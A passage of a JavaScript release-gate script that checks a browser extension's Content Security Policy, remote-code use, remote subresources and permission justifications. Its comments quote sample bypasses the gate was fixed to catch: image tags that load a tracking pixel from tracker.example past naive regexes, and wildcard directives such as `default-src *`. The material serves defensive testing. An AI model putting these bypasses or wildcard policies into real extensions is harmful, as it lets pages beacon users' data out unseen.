   WHERE THE INTENDED VALUES LIVE — ONE PLACE PER DIRECTIVE, AND connect-src IS
   NOT ONE OF THEM

   CSP_POSTURE is this project's declaration of what each directive is meant to
   say, in the same shape as LIMITS further down: the rule written once, beside
   the gate that enforces it. connect-src is deliberately NOT in the table. Its
   intended value is already derived, in the block above, from tool.json's
   policy.networkAllowlist — and a copy here would be a second answer to one
   question, the kind that agrees on the day it is written and disagrees forever
   after. That is not left to anybody's memory: POSTURE_ELSEWHERE is checked
   below and this gate REFUSES TO RUN if the two ever name the same directive.

   'none' IS INERT THE MOMENT ANY OTHER SOURCE SITS BESIDE IT

   `img-src 'none' https://tracker.example` does not mean none: CSP3 ignores
   'none' in a source list of length > 1, so that policy permits the tracker. A
   check that greps for the token 'none' passes on exactly that string — the
   prose-grep failure this file's own banner forbids, and the one the block
   above already had to be rewritten for. So every list here is parsed into its
   sources and the SOURCES are judged; and when 'none' is dropped as inert the
   message says so, because a failure printed over a string that visibly
   contains 'none' otherwise reads as a bug in the checker.

   ABSENT IS NOT WIDENED, AND ABSENT IS NOT AUTOMATICALLY UNRESTRICTED

   Three kinds of finding, counted apart on purpose, plus the case that is no
   finding at all:
     - "widened": DECLARED and permitting more than the intent -> somebody took
       a fence down;
     - ABSENT, and a fallback reaches it CARRYING NO MORE THAN THE INTENT -> not
       a finding at all. An absent img-src falls back to default-src, and
       frame-src falls back to child-src and then to default-src. `default-src
       'self'` with no img-src is a SAFE policy, and a gate that calls it
       unrestricted is a gate people switch off. So the fallback is resolved
       before anything is judged;
     - "inherited too wide": ABSENT, a fallback reaches it, and the fallback
       permits more than the intent -> a fence borrowed from a wider one. Closed
       either by declaring the directive or by narrowing the fallback. This is
       the kind that used to be counted as the next one, contradicting its own
       finding text in the same run;
     - "absent and uncovered": ABSENT with nothing to fall back to ->
       unrestricted, but nobody widened anything: this fence was never built,
       and there is nothing to narrow. base-uri and form-action have NO fallback
       — default-src does not cover them — which is the half of the CSP3 rule a
       hand-written table gets backwards in the dangerous direction, reporting a
       hole as covered.

   WHAT THIS TABLE DOES NOT MODEL, SAID HERE BECAUSE THE GATE SAYS IT AND A
   COMMENT THAT DISAGREES WITH THE OUTPUT IS THE DEFECT

   CSP_POSTURE grades nine directives; connect-src is graded above; the browser
   honours more than ten on an extension page. The rest — style-src and its
   -elem/-attr children, font-src, media-src, manifest-src, child-src,
   frame-ancestors — are NOT modelled here, and this file does not pretend they
   are: UNMODELLED below is the list, and the gate prints it together
   with what each one actually resolves to in the manifest being graded.

   That matters on the tree this repo ships. Extension/Full_Screen_Shot's
   manifest declares NO default-src (templates/tool/manifest.json's does), so
   all eight names in that list fall back to nothing and are UNRESTRICTED on
   FullShot's extension pages today. Measured 2026-08-26.

   Seven of the eight are WARNED about, because one line — `default-src 'self'`
   in manifest.json — closes all seven and changes nothing about the directives
   graded above. frame-ancestors is the eighth
   and is stated in the note instead: it has NO fallback in ANY manifest, so
   "absent means unrestricted" is its permanent condition rather than this
   tool's configuration, and it governs who may EMBED the page rather than what
   the page loads. A warning and not a failure, because the fix is an edit to a
   manifest this gate does not own; a warning that NAMES the seven is still a
   truer sentence than a table that grades nine and reads as though it had
   covered the policy.

   THE UNTABLED-BUT-DECLARED CASE IS DIFFERENT AND IS A FAILURE. A directive the
   table does not model but the manifest DOES declare used to earn a note and
   nothing else — and note() in lib/report.mjs only console.log()s: it never
   pushes to `warns`, never reaches the counts, and cannot move the exit code.
   Measured 2026-08-26, against the six-entry table of that day: `default-src *`
   added beside all six correct graded directives -> `17 passed`, EXIT 0, one
   note. default-src is the umbrella every one of those six falls back to, so
   that is a wildcard underneath the whole policy. Untabled declared directives
   are now checked for sources that are not CLOSED — see CLOSED_SOURCE — and a
   wildcard, a remote host or 'unsafe-inline' there FAILS. It is still not
   graded against an intent: this gate has none for those directives, and
   saying only what it checked is the point.

   IT GRADES manifest.json, WHICH IS THE CHROMIUM MANIFEST. publish/
   manifest.firefox.json deletes content_security_policy again for Gecko with an
   RFC 7386 null member, deliberately, so the AMO build keeps the strict MV3
   default. That is recorded in the tool's own tool.json and is not this gate's
   subject: nothing below reads the overlay, and a Firefox package carrying no
   CSP is not a finding here. */
const CSP_POSTURE = [
  { name: 'script-src', intent: ["'self'"], fallback: ['default-src'],
    why: 'packaged script only. A remote or inline source here is the MV3 remote-code rule broken at the browser, where the scans above cannot see it.' },
  { name: 'object-src', intent: ["'none'"], fallback: ['default-src'],
    why: '<object>/<embed> are a plugin-shaped hole straight through every other directive.' },
  { name: 'img-src', intent: ["'self'", 'data:', 'blob:'], fallback: ['default-src'],
    why: 'packaged icons plus the data:/blob: URLs the capture pipeline builds. A remote image URL is a beacon that no network API appears in: it leaves the machine and carries the referrer, which is what "nothing leaves your machine" forbids.' },
  { name: 'frame-src', intent: ["'none'"], fallback: ['child-src', 'default-src'],
    why: 'an extension page frames nothing. A frame is a second origin running inside the trusted one.' },
  { name: 'base-uri', intent: ["'none'"], fallback: [],
    why: 'an injected <base> silently re-points every relative URL on the page. NOT covered by default-src.' },
  { name: 'form-action', intent: ["'none'"], fallback: [],
    why: 'the exfiltration path that is not a network API and that connect-src does not touch. NOT covered by default-src.' },
  /* THE THREE BELOW EXIST BECAUSE GRADING script-src ALONE GRADES THE DIRECTIVE
     THAT DOES NOT APPLY. Measured 2026-08-26 on Extension/Full_Screen_Shot:
     "script-src 'self'; script-src-elem *; ..." printed `6 more CSP
     directive(s) hold the intended posture` at EXIT 0, and Chromium prefers
     script-src-elem over script-src for element loads — so the one the gate
     read was the one the browser ignored. Each is absent from every manifest in
     this repo and INHERITS script-src, which is why adding them costs no
     manifest edit: they hold today and they bite the moment one is widened. */
  { name: 'script-src-elem', intent: ["'self'"], fallback: ['script-src', 'default-src'],
    why: 'Chromium PREFERS this over script-src for <script> element loads. `script-src \'self\'; script-src-elem *` is remote script executing under a script-src that still reads \'self\'.' },
  { name: 'script-src-attr', intent: ["'self'"], fallback: ['script-src', 'default-src'],
    why: 'preferred over script-src for inline event-handler attributes. \'self\' does not permit them; \'unsafe-inline\' or a hash does, and that widening would be invisible to a script-src-only reading.' },
  { name: 'worker-src', intent: ["'self'"], fallback: ['child-src', 'script-src', 'default-src'],
    why: 'a Worker is a second script context with its own fetch. Its fallback runs through child-src BEFORE script-src, so a child-src opened for framing silently opens workers too.' }
];
/* Directive -> where its intended value is ALREADY declared. Anything named
   here must never appear in CSP_POSTURE. */
const POSTURE_ELSEWHERE = new Map([
  ['connect-src', 'tool.json policy.networkAllowlist, graded by the block above']
]);

/* THE LIMIT, WRITTEN DOWN. Directives the browser honours on an extension page
   that CSP_POSTURE does NOT model, with the CSP3 fallback chain each one
   actually walks. Nothing here is graded against an intent — the gate prints
   what each resolves to and warns when the chain reaches nothing. Keeping the
   chains here rather than in prose is the point: a fallback list in a comment
   is a claim, and this one is executed. */
const UNMODELLED = [
  { name: 'style-src', fallback: ['default-src'] },
  { name: 'style-src-elem', fallback: ['style-src', 'default-src'] },
  { name: 'style-src-attr', fallback: ['style-src', 'default-src'] },
  { name: 'font-src', fallback: ['default-src'] },
  { name: 'media-src', fallback: ['default-src'] },
  { name: 'manifest-src', fallback: ['default-src'] },
  { name: 'child-src', fallback: ['default-src'] },
  { name: 'frame-ancestors', fallback: [] }
];

/* Sources an untabled DECLARED directive may carry without this gate objecting:
   none of them can reach the network or introduce code. Anything else there —
   `*`, a host, a remote scheme, 'unsafe-inline', 'unsafe-eval' — is a source
   the browser honours and no line in this file grades against an intent. */
const CLOSED_SOURCE = new Set(["'self'", 'data:', 'blob:', 'filesystem:']);

{
  /* AN EMPTY TABLE IS A GATE WITH NO SUBJECT, AND IT USED TO PRINT A PASS.
     Measured 2026-08-26: empty CSP_POSTURE, everything else untouched ->
     `PASS  0 more CSP directive(s) hold the intended posture`, 17 passed,
     EXIT 0 — verbatim the failure the banner at the top of this file is about,
     and the manifest side of the same hole is already guarded twelve lines down
     ("THIS GATE HAS NO SUBJECT, so it must not print a pass"). die() rather
     than fail() because an empty table is a defect in THIS SCRIPT, not in the
     tool it grades — the same class, and the same exit 2, as the duplicate
     declaration guarded immediately below. */
  if (!CSP_POSTURE.length) {
    die('CSP_POSTURE is empty, so the CSP posture gate has nothing to grade.\n' +
      'It would print "0 more CSP directive(s) hold the intended posture" and exit 0 — a pass over an\n' +
      'empty subject, which inflates apparent coverage and is the one failure this whole file is\n' +
      'written against. Restore the table or delete the gate; do not run it empty.');
  }

  for (const d of CSP_POSTURE) {
    if (!POSTURE_ELSEWHERE.has(d.name)) continue;
    die('CSP_POSTURE declares "' + d.name + '", whose intended value is already declared in ' +
      POSTURE_ELSEWHERE.get(d.name) + '.\n' +
      'Two declarations of one intent is the defect this table exists to avoid: they agree on the day\n' +
      'they are written and disagree forever after, and the run then reports whichever one it read\n' +
      'last. Delete one. This gate refuses to run rather than grade a directive twice against two\n' +
      'expectations that are free to differ.');
  }

  /* CSP3 evaluation, not substring reading. 'none' beside any other source is
     ignored by the browser; an empty source list matches nothing, which is what
     'none' alone means; keywords, schemes and hosts are all ASCII
     case-insensitive, so the comparison is done lowercased and the ORIGINAL
     spelling is what gets printed. */
  const sourcesOf = list => {
    const seen = [];
    for (const s of list) { const v = String(s).toLowerCase(); if (!seen.includes(v)) seen.push(v); }
    if (!seen.includes("'none'")) return { sources: seen, inertNone: false };
    if (seen.length === 1) return { sources: [], inertNone: false };
    return { sources: seen.filter(s => s !== "'none'"), inertNone: true };
  };

  /* The directive's own list, or the first fallback that IS declared, or
     nothing. `via` is null when the directive itself is declared. */
  const effectiveOf = d => {
    if (cspDirectives.has(d.name)) return { list: cspDirectives.get(d.name), via: null };
    for (const f of d.fallback) if (cspDirectives.has(f)) return { list: cspDirectives.get(f), via: f };
    return null;
  };

  const findings = [], held = [];
  for (const d of CSP_POSTURE) {
    const want = sourcesOf(d.intent).sources;
    const wantShown = d.intent.join(' ');
    const eff = effectiveOf(d);
    if (!eff) {
      findings.push({ kind: 'absent', text: d.name + ': NOT DECLARED' +
        (d.fallback.length
          ? ', and neither is ' + d.fallback.join(' nor ') + ', so nothing falls back to it'
          : ', and it has NO fallback at all — default-src does not cover ' + d.name) + '.\n' +
        '    the browser therefore permits everything here.\n' +
        '    intended: ' + d.name + ' ' + wantShown + '\n' +
        '    why it matters: ' + d.why });
      continue;
    }
    const got = sourcesOf(eff.list);
    const shown = (eff.via ? eff.via + ' (inherited by ' + d.name + ') ' : d.name + ' ') + eff.list.join(' ');
    const extra = got.sources.filter(s => !want.includes(s));
    if (!extra.length) {
      held.push(shown +
        (got.inertNone ? " [contains 'none', INERT here, ignored]" : '') +
        (got.sources.length < want.length ? ' [narrower than intended, which is not a widening]' : ''));
      continue;
    }
    /* THREE KINDS, NOT TWO, AND THE THIRD USED TO BE FILED UNDER THE WRONG ONE.
       `kind: eff.via ? 'absent' : 'widened'` counted an absent-but-INHERITING
       directive as "absent and uncovered" — while the body text two lines up
       says "NOT DECLARED, and the <fallback> it falls back to does not cover
       it", i.e. a fallback DID reach it. The summary line and the finding it
       summarised contradicted each other inside one run, and the tally line
       goes on to define "absent and uncovered" as "no fallback reaches it".
       They are also fixed by different edits: 'inherited' is closed by
       declaring the directive OR by narrowing the fallback; 'absent' has
       nothing to narrow. */
    findings.push({ kind: eff.via ? 'inherited' : 'widened', text: d.name + ': ' +
      (eff.via
        ? 'NOT DECLARED, and the ' + eff.via + ' it falls back to does not cover it'
        : 'DECLARED, and it permits more than the intent') + '.\n' +
      '    found:    ' + shown + '\n' +
      (got.inertNone
        ? "    NOTE:     'none' is in that list and is INERT — CSP3 ignores it beside another source,\n" +
          '              so this policy is NOT none, whatever it reads like.\n'
        : '') +
      '    intended: ' + d.name + ' ' + wantShown + '\n' +
      '    permitted and not intended: ' + extra.join(', ') + '\n' +
      '    why it matters: ' + d.why });
  }

  /* Declared directives this table says nothing about. TWO THINGS WERE WRONG
     HERE, AND THE FIRST IS THE ONE THAT COST A HOLE.

     ONE: the only consequence was a note, and note() in lib/report.mjs merely
     console.log()s — it never pushes to `warns`, never enters the counts, and
     cannot move the exit code. Measured 2026-08-26 on Extension/Full_Screen_
     Shot, exit captured on its own line: `default-src *` added beside all six
     correct graded directives -> `17 passed`, EXIT 0, one note. default-src is
     the umbrella every graded directive falls back to, so that wildcard sits
     underneath the entire policy and nothing here objected. A declared
     directive carrying a source this posture would refuse anywhere else is now
     a FAILURE, not a line of prose.

     TWO: the list did not say that a directive was read as a FALLBACK, so one
     run printed both `child-src (inherited by frame-src) 'none'` and `declared
     but NOT graded by CSP_POSTURE: child-src`. Both sentences are true —
     child-src's OWN source list is graded against no intent here — but printed
     bare they read as a contradiction, and a checker that looks self-
     contradictory is a checker people stop reading. The attribution is now
     printed beside the name. */
  const gradedByTable = k => CSP_POSTURE.some(d => d.name === k) || POSTURE_ELSEWHERE.has(k);
  const ungraded = [...cspDirectives.keys()].filter(k => !gradedByTable(k));
  const ungradedShown = ungraded.map(k => {
    const used = CSP_POSTURE.filter(d => {
      const e = effectiveOf(d);
      return e && e.via === k;
    }).map(d => d.name);
    return k + (used.length ? ' (read only as the fallback for ' + used.join(', ') + ')' : '');
  });
  const ungradedOpen = [];
  for (const k of ungraded) {
    const got = sourcesOf(cspDirectives.get(k));
    const open = got.sources.filter(s => !CLOSED_SOURCE.has(s));
    if (open.length) ungradedOpen.push({ name: k, list: cspDirectives.get(k), open, inertNone: got.inertNone });
  }

  if (cspIgnoredRepeats.length) {
    r.note('CSP directive(s) repeated and therefore IGNORED by the browser (first occurrence wins): ' +
      cspIgnoredRepeats.join(' · ') + ' — every verdict below is about the FIRST occurrence, which is the one enforced.');
  }

  if (typeof cspDeclared !== 'string' || cspDirectives.size === 0) {
    r.fail('every intended CSP directive is declared and unwidened',
      'content_security_policy.extension_pages is ' +
      (cspDeclared === undefined ? 'not declared at all'
        : 'not a policy this script can parse: ' + JSON.stringify(cspDeclared)) + '.\n' +
      'THIS GATE HAS NO SUBJECT, so it must not print a pass — a guard that grades nothing and reports\n' +
      '"ok" is the exact failure the banner at the top of this file exists about. All ' +
      CSP_POSTURE.length + ' intended directive(s)\nare unenforced by the browser:\n' +
      CSP_POSTURE.map(d => '  ' + d.name + ' ' + d.intent.join(' ')).join('\n') +
      '\n\nDeclare them in manifest.json under content_security_policy.extension_pages.\n' +
      'templates/tool/manifest.json already carries this posture, and the browser is the only thing\n' +
      'that ENFORCES it — every scan above only asserts it.');
  } else if (findings.length) {
    const count = k => findings.filter(f => f.kind === k).length;
    r.fail('every intended CSP directive is declared and unwidened',
      findings.length + ' of ' + CSP_POSTURE.length + ' graded directive(s) do not hold — ' +
      count('widened') + ' widened, ' + count('inherited') + ' inherited too wide, ' +
      count('absent') + ' absent and uncovered:\n' +
      findings.map(f => '  ' + f.text).join('\n') +
      '\nTHOSE THREE WORDS ARE DIFFERENT FINDINGS ON PURPOSE, AND ONE OF THEM USED TO BE MISFILED.\n' +
      '"widened" means the manifest still declares the directive and somebody made it permit more — a\n' +
      'fence taken down. "inherited too wide" means the directive is absent and a fallback DOES reach\n' +
      'it, carrying more than the intent — a fence borrowed from a wider one; it is closed either by\n' +
      'declaring the directive or by narrowing the fallback. "absent and uncovered" means nothing\n' +
      'declares it and NO fallback reaches it — a fence never built, with nothing to narrow. Until\n' +
      '2026-08-26 the middle case was counted as "absent and uncovered", contradicting its own finding\n' +
      'text ("the X it falls back to does not cover it") in the same run.\n' +
      'The intended values are declared in exactly one place: CSP_POSTURE in this file. connect-src is\n' +
      'not among them by design — it comes from tool.json policy.networkAllowlist, above.');
  } else {
    r.pass(CSP_POSTURE.length + ' more CSP directive(s) hold the intended posture',
      'connect-src is graded separately, above, against policy.networkAllowlist');
    r.note('graded: ' + held.join(' · '));
  }

  /* A DECLARED DIRECTIVE THE TABLE DOES NOT MODEL IS STILL ENFORCED BY THE
     BROWSER. It is not graded against an intent — this gate has none for it —
     but a wildcard, a remote host or 'unsafe-inline' there is a source no line
     in this file vouches for, and in default-src's case it is the umbrella
     under every graded directive. That is a failure, not a note. */
  if (ungradedOpen.length) {
    r.fail('every declared CSP directive outside CSP_POSTURE is closed',
      ungradedOpen.length + ' declared directive(s) this table does not model carry sources that are not closed:\n' +
      ungradedOpen.map(u => '  ' + u.name + ' ' + u.list.join(' ') + '\n' +
        (u.inertNone ? "      NOTE: 'none' is in that list and is INERT — CSP3 ignores it beside another source.\n" : '') +
        '      not closed: ' + u.open.join(', ')).join('\n') +
      '\n\nCLOSED means a source that can neither reach the network nor introduce code: ' +
      [...CLOSED_SOURCE].join(', ') + " (and 'none' alone).\n" +
      'This gate holds no intent for these directives — see the NOT-modelled note below for the whole\n' +
      'list — so it cannot say what they SHOULD permit. It can say that a wildcard or a remote host\n' +
      'here is enforced by the browser and graded by nothing. default-src is the worst case: every\n' +
      'directive in CSP_POSTURE falls back to it, so `default-src *` is a wildcard underneath the whole\n' +
      'policy, and it used to print one note and exit 0.\n' +
      'TO RESOLVE: narrow the directive, or — if this tool genuinely needs that source — add the\n' +
      'directive to CSP_POSTURE in this file with the intent it is meant to hold, so the value is\n' +
      'declared once and graded from then on. Turning red until the table catches up with the manifest\n' +
      'is the direction to be wrong in: the alternative is the manifest quietly outgrowing the table,\n' +
      'which is what this whole section exists about.');
  }

  if (ungraded.length) {
    r.note('declared but NOT graded by CSP_POSTURE: ' + ungradedShown.join(', ') +
      ' — checked only for sources that are not closed, never against an intent.' +
      ' Printed because a table that falls behind the manifest it grades still prints clean.');
  }

  /* ---- THE LIMIT ----
     The note above can only name directives the manifest DECLARES, so it is
     structurally blind to a directive that is neither declared NOR tabled —
     which is exactly the state that leaves one unrestricted. UNMODELLED is that
     blind spot, written down and resolved against this manifest.

     On Extension/Full_Screen_Shot this is not hypothetical: its manifest
     declares no default-src (templates/tool/manifest.json's does), so every
     name below falls back to nothing. Measured 2026-08-26. */
  if (typeof cspDeclared === 'string' && cspDirectives.size) {
    const lines = [], unrestricted = [];
    for (const u of UNMODELLED) {
      if (cspDirectives.has(u.name)) {
        lines.push(u.name + ': declared (' + cspDirectives.get(u.name).join(' ') + '), checked for open sources only');
        continue;
      }
      const via = u.fallback.find(f => cspDirectives.has(f));
      if (via) { lines.push(u.name + ': absent, inherits ' + via + ' ' + cspDirectives.get(via).join(' ')); continue; }
      lines.push(u.name + ': absent, ' +
        (u.fallback.length ? 'and so is ' + u.fallback.join(' and ') : 'and it has NO fallback, ever') +
        ' — UNRESTRICTED');
      unrestricted.push(u.name);
    }
    r.note('NOT modelled by CSP_POSTURE, so never graded against an intent — ' + UNMODELLED.length +
      ' directive(s): ' + lines.join(' · '));

    /* frame-ancestors is excluded from the warning on purpose: it has NO
       fallback in any manifest, so "absent means unrestricted" is its permanent
       state rather than this tool's configuration, and it governs who may EMBED
       the page rather than what the page loads — on extension pages only a
       web_accessible_resources entry can be framed by a web page at all, and
       the warning below says how many this tool declares. It is stated in the
       note above rather than warned about. */
    const war = Array.isArray(mf.web_accessible_resources) ? mf.web_accessible_resources.length : 0;
    const noUmbrella = unrestricted.filter(n => n !== 'frame-ancestors');
    if (noUmbrella.length) {
      r.warn(noUmbrella.length + ' CSP directive(s) this gate does not model are UNRESTRICTED',
        noUmbrella.join(', ') + '\n' +
        'None of them is declared, none has a declared fallback, and this manifest declares NO\n' +
        'default-src — so the browser permits everything for each of them on this tool\'s extension\n' +
        'pages. This is a COVERAGE STATEMENT, not a regression: no gate here ever graded them, and\n' +
        'saying so is the point. `default-src \'self\'` in manifest.json closes all ' + noUmbrella.length + ' in one line and\n' +
        'changes nothing about the ' + CSP_POSTURE.length + ' directives graded above.\n' +
        'A warning rather than a failure: the fix is an edit to manifest.json, the packaged-HTML gate\n' +
        'below already refuses a remote subresource in a shipped page, and frame-ancestors — absent\n' +
        'here too, with no fallback in any manifest — is stated in the note above instead, because ' +
        (war ? war + ' web_accessible_resources entry/entries exist so a web page could frame them'
             : 'this manifest declares no web_accessible_resources, so no web page can frame these pages at all') + '.');
    }
  }
}

/* ---------------- 2. no remote code ---------------- */
{
  const CODE = [
    { name: 'eval(', re: /\beval\s*\(/g },
    { name: 'new Function(', re: /\bnew\s+Function\s*\(/g }
  ];
  const hits = [], raws = [];
  for (const rel of jsFiles) {
    const s = scan(rel, CODE);
    hits.push(...s.real);
    raws.push(...s.rawOnly);
    /* String-form setTimeout/setInterval needs the quote, which the full
       tokeniser blanks — so this one runs on comment-stripped raw text. */
    for (const m of noComments(rel).matchAll(/\b(setTimeout|setInterval)\s*\(\s*['"`]/g)) {
      hits.push({ rel, name: 'string-form ' + m[1] + '()', index: m.index, line: lineOf(raw(rel), m.index), text: lineText(raw(rel), m.index) });
    }
  }
  if (hits.length) {
    r.fail('no runtime code generation in packaged files',
      hits.length + ' occurrence(s):\n' + hits.map(fmt).join('\n') +
      '\n\nMV3 forbids remote code and store review checks for it. eval and Function() also defeat the\n' +
      'CSP that backs the privacy claim, and AMO treats them as grounds for a full source review.');
  } else {
    passOverSet('no eval, no Function(), no string-form timers', undefined,
      jsFiles.length, 'script(s)', shippable.filter(isJs).length);
  }
  if (raws.length) r.warn('code-generation text found only in comments or strings', raws.map(fmt).join('\n'));
}

/* Remote subresources in packaged HTML.
   THREE SEPARATE BYPASSES LIVED IN THE TWO REGEXES BELOW, ALL MEASURED:
     <img data-src="placeholder.png" src="https://tracker.example/px.gif">  passed
     <img alt="width > height"       src="https://tracker.example/px.gif">  passed
     <img srcset="https://tracker.example/px.gif 1x">                       passed
   The first because the attribute pattern had no /g and \b matches inside
   `data-src`, so only the FIRST src/href-SHAPED attribute in a tag was ever
   read. The second because [^>]* truncated the tag body at a '>' inside a
   quoted value. The third because the attribute set was src|href only. An
   attribute reorder is not an exotic input; it is what a formatter does. */
{
  const bad = [], links = [], deferred = [];
  const TAG = /<\s*(script|link|img|iframe|source|video|audio|object|embed|a)\b((?:"[^"]*"|'[^']*'|[^>])*)>/gi;
  const ATTR = /(?:^|[\s"'/])(src|href|srcset|poster|data|formaction|xlink:href)\s*=\s*("([^"]*)"|'([^']*)'|([^\s>]+))/gi;
  const DATA_ATTR = /(?:^|[\s"'/])(data-[a-z0-9-]+)\s*=\s*("([^"]*)"|'([^']*)'|([^\s>]+))/gi;
  const value = a => (a[3] !== undefined ? a[3] : a[4] !== undefined ? a[4] : a[5] || '').trim();
  const remote = u => /^(?:https?:)?\/\//i.test(u);

  for (const rel of htmlFiles) {
    const src = raw(rel);
    for (const m of src.matchAll(TAG)) {
      const tag = m[1].toLowerCase();
      const body = m[2] || '';
      for (const a of body.matchAll(ATTR)) {
        const attr = a[1].toLowerCase();
        /* srcset is a comma-separated candidate list; each candidate is a URL
           followed by a descriptor, so `https://x 1x, https://y 2x` is TWO
           hosts and reporting only the first would understate it. */
        const urls = attr === 'srcset'
          ? value(a).split(',').map(c => c.trim().split(/\s+/)[0]).filter(Boolean)
          : [value(a)];
        for (const url of urls) {
          if (!remote(url)) continue;
          const hit = { rel, name: '<' + tag + ' ' + a[1] + '="' + url + '">', line: lineOf(src, m.index), text: lineText(src, m.index) };
          /* An <a href> navigates; it loads nothing into the extension's context.
             Spec §4.3.2 words this rule as "no src/href with an http(s) scheme",
             which taken literally would fail the privacy-policy link every options
             page is required to carry. Failing that would get this gate switched
             off, so external <a href> is REPORTED rather than failed, and every
             other tag — the ones that actually load a subresource — still fails.
             Scoped to href: an <a src="..."> is not navigation and is not laundered. */
          (tag === 'a' && attr === 'href' ? links : bad).push(hit);
        }
      }
      for (const a of body.matchAll(DATA_ATTR)) {
        const url = value(a);
        if (remote(url)) deferred.push({ rel, name: '<' + tag + ' ' + a[1] + '="' + url + '">', line: lineOf(src, m.index), text: lineText(src, m.index) });
      }
    }
  }
  if (bad.length) {
    r.fail('no remote subresources in packaged HTML',
      bad.length + ' element(s) load something over the network:\n' + bad.map(fmt).join('\n') +
      '\n\nMV3 refuses remote scripts outright; a remote stylesheet, image or frame leaks the user\'s IP\n' +
      'address and the fact that they opened the page, which is precisely what "no analytics" denies.');
  } else {
    passOverSet('no remote subresources in ' + htmlFiles.length + ' packaged page(s)', undefined,
      htmlFiles.length, 'page(s)', shippable.filter(isHtml).length);
  }
  if (deferred.length) {
    r.warn('remote URL(s) parked in data-* attributes', deferred.map(fmt).join('\n') +
      '\nThese load nothing by themselves, so they are not a failure. They are printed because a remote\n' +
      'URL sitting in data-src is normally there so that some script can assign it to .src later — and\n' +
      'that assignment is a network call this gate would never see.');
  }
  if (links.length) {
    r.note('external <a href> link(s) (navigation, not a subresource — reported, not failed):');
    for (const l of links) r.note('  ' + l.rel + ':' + l.line + '  ' + l.name);
  }
}

/* ---------------- manifest shape: an array, or nothing ---------------- */
/* `Array.isArray(mf.x) ? mf.x : []` reads a MIS-SHAPED value as an ABSENT one,
   and absence is what the two gates below reward. Measured, all at exit 0:
   `"permissions": {"tabs":true,"history":true}` -> PASS "no permissions
   requested — the strongest possible answer to a permission review";
   `"host_permissions": "<all_urls>"` -> PASS "no static host_permissions — the
   tool never asks for a site up front". The gates printed their strongest
   verdicts over values they had not read. */
const arr = {};
{
  const bad = [];
  for (const key of ['permissions', 'optional_permissions', 'host_permissions', 'optional_host_permissions']) {
    const v = mf[key];
    if (v === undefined) { arr[key] = []; continue; }
    if (Array.isArray(v)) { arr[key] = v; continue; }
    arr[key] = null;
    bad.push('  ' + key + ' is ' + (v === null ? 'null' : typeof v) + ': ' + JSON.stringify(v));
  }
  if (bad.length) {
    r.fail('every manifest permission key is an array',
      bad.join('\n') +
      '\nChrome requires an array of strings. Every gate below reads these with Array.isArray(), so a\n' +
      'mis-shaped value reads as ABSENT — and the gates are built to reward absence. The verdicts that\n' +
      'depend on the unreadable key are withheld rather than guessed.');
  }
}

/* ---------------- 3. permissions justified ---------------- */
const PLACEHOLDER = /^(?:|todo\b.*|tbd\b.*|fixme\b.*|\?+|xxx+|replace.*|why\b.*)$/i;
{
  const rawJust = tool.policy && tool.policy.permissions;
  if (rawJust === undefined || typeof rawJust !== 'object' || Array.isArray(rawJust)) {
    r.fail('policy.permissions is declared',
      'tool.json has no policy.permissions object. It maps each manifest permission to the reason it is\n' +
      'needed — the exact text Chrome review asks for at submission, and the text the README permission\n' +
      'table is generated from.');
  }
  const justified = (rawJust && typeof rawJust === 'object' && !Array.isArray(rawJust)) ? rawJust : {};
  const declared = arr.permissions || [];
  const optional = arr.optional_permissions || [];
  const readable = arr.permissions !== null && arr.optional_permissions !== null;
  const missing = [], placeholder = [];

  for (const p of [...declared, ...optional]) {
    const j = justified[p];
    if (typeof j !== 'string' || !j.trim()) { missing.push(p); continue; }
    if (PLACEHOLDER.test(j.trim())) placeholder.push(p + ' -> "' + j.trim() + '"');
  }
  if (missing.length || placeholder.length) {
    r.fail('every manifest permission is justified in tool.json',
      (missing.length ? 'no justification at all: ' + missing.join(', ') + '\n' : '') +
      (placeholder.length ? 'placeholder justification: ' + placeholder.join(' · ') + '\n' : '') +
      'Chrome review asks for exactly this text, in a form, at submission. Writing it in tool.json\n' +
      'means it is versioned, reviewable, and generated into the README permission table — rather\n' +
      'than composed under time pressure on the night of a release.');
  } else if (declared.length + optional.length === 0) {
    /* "No permissions requested" is the strongest sentence this file can print,
       so it is only available when the keys were genuinely readable and empty. */
    if (readable) r.pass('no permissions requested', 'the strongest possible answer to a permission review');
  } else {
    r.pass((declared.length + optional.length) + ' permission(s), all justified', [...declared, ...optional].join(', '));
  }

  const unused = Object.keys(justified).filter(k => !declared.includes(k) && !optional.includes(k));
  if (unused.length) {
    r.warn('justified but not requested: ' + unused.join(', '),
      'tool.json explains ' + (unused.length === 1 ? 'a permission' : 'permissions') + ' the manifest does not ask for.\n' +
      'Either the manifest dropped it (and the README still promises it) or the justification is stale.');
  }

  const optHosts = (tool.policy && tool.policy.optionalHostPermissions) || {};
  for (const h of (arr.optional_host_permissions || [])) {
    const j = optHosts[h];
    if (typeof j !== 'string' || !j.trim() || PLACEHOLDER.test(j.trim())) {
      r.warn('optional host permission "' + h + '" has no justification',
        'It is optional and revocable, so it is not a static-host failure — but the store asks about it\n' +
        'at review, and a user reading the permission prompt deserves the same sentence.');
    }
  }
}

/* ---------------- 4. no broad static host permissions ---------------- */
/* The subject is HOST ACCESS, not one manifest key. content_scripts[].matches
   is granted at install exactly as host_permissions is, produces the same
   "Read and change your data on ..." prompt, and was read by nothing here:
   measured, `"content_scripts":[{"matches":["<all_urls>"],"js":["content.js"]}]`
   printed PASS "no static host_permissions — the tool never asks for a site up
   front" at exit 0. web_accessible_resources[].matches and
   externally_connectable.matches are deliberately NOT folded in: they govern
   which web origins may reach INTO the extension, and this gate's failure text
   ("granted at INSTALL ... for every matching site") would be false for them. */
{
  const cs = Array.isArray(mf.content_scripts) ? mf.content_scripts : [];
  const hosts = [
    ...(arr.host_permissions || []).map(p => ({ pat: p, from: 'host_permissions' })),
    ...cs.flatMap((c, i) => (Array.isArray(c && c.matches) ? c.matches : [])
      .map(m => ({ pat: m, from: 'content_scripts[' + i + '].matches' })))
  ];
  const readable = arr.host_permissions !== null;
  const why = tool.policy && tool.policy.broadHostJustification;
  const show = hosts.map(h => h.pat + ' (' + h.from + ')').join(', ');
  if (hosts.length === 0) {
    if (readable) {
      r.pass('no static host_permissions',
        (arr.optional_host_permissions || []).length
          ? 'host access is optional and runtime-granted, which Gecko\'s stricter model also wants'
          : 'and no content_scripts match either — the tool never asks for a site up front');
    }
  } else if (typeof why === 'string' && why.trim() && !PLACEHOLDER.test(why.trim())) {
    r.warn(hosts.length + ' static host grant(s), justified', show + '\n' + why.trim());
  } else {
    /* The label keeps saying "host_permissions" because that is the name of the
       rule and of the store's own warning; `show` names the key each pattern
       actually came from, which is the part an author needs to act. */
    r.fail('static host_permissions require an explicit justification',
